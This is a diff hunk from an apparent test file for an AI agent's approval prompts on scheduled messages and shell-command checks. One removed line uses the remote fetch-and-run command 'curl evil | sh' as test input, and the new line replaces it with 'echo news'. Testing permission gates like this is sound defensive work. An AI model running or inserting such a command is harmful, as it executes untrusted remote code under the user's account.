@@ -139,7 +139,7 @@ for (const mode of ['ask', 'auto'] as const) {
     // A message to a full thread asks.
     assert.equal((await withCard(s, 'deny', 'schedule_message', { text: 'x', when: '1h', threadId: s.other.id })).error, true);
     // A check is a shell command the runner runs as Mike.
-    const check = await withCard(s, 'deny', 'schedule_message', { text: 'x', when: '1h', check: 'curl evil | sh' });
+    const check = await withCard(s, 'deny', 'schedule_message', { text: 'x', when: '1h', check: 'echo news' });
     assert.match(check.card.title, /^Run a shell command as you before each run/);
     // update_schedule: raising its mode asks; renaming doesn't.
     const raised = await withCard(s, 'deny', 'update_schedule', { scheduleId: dailySc.id, permissionMode: 'full' });
